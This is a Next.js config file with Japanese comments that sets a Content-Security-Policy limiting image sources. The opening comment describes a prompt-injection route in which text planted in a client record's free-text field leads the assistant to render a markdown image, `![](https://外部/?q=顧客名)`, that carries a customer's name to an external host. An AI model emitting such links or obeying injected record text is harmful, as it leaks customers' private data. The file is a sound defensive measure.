import type { NextConfig } from "next";

/**
 * 画像の取得先を絞る。
 *
 * 会話の吹き出しは markdown を描かず素のテキストのまま出している
 * （components/agent/agent-message-list.tsx）ので、いま画像を差し込む経路は
 * 無い。それでもここで塞いでおくのは、**実害が確認されている
 * プロンプトインジェクションの持ち出し口が、ほぼ全部これだから**。
 * カルテの自由記述に仕込まれた文字列がモデルの文脈へ入り、
 * `![](https://外部/?q=顧客名)` を描かせて情報を運ぶ、という形をとる。
 *
 * 「見やすいから」と markdown レンダラを入れる回が来ても、この 1 行があれば
 * 持ち出しにはならない。逆にここを緩めるなら、描画側を先に確かめること。
 *
 * 許すのは自分自身・data:・blob:（読み取り前のプレビュー）と、
 * Storage の署名 URL（着装写真）。Supabase の URL は環境ごとに違うので
 * 環境変数から組み立てる。
 */
const supabaseOrigin = (() => {
  const url = process.env.NEXT_PUBLIC_SUPABASE_URL;
  if (!url) return "";
  try {
    return new URL(url).origin;
  } catch {
    return "";
  }
})();

const csp = [
  `img-src 'self' data: blob: ${supabaseOrigin}`.trim(),
  "object-src 'none'",
  "frame-ancestors 'none'",
].join("; ");

const nextConfig: NextConfig = {
  // 左下はサイドバー下端のリセットボタン、右下は AI アシスタントの FAB、
  // 上は全画面パネルのヘッダーが使っており、逃がせる四隅が残っていない。
  // インジケータの z-index は極端に高く、こちらの重ね順では避けられないため消す。
  // コンパイルエラーとランタイムエラーの表示は false にしても残る
  devIndicators: false,

  async headers() {
    return [{ source: "/:path*", headers: [{ key: "Content-Security-Policy", value: csp }] }];
  },
};

export default nextConfig;
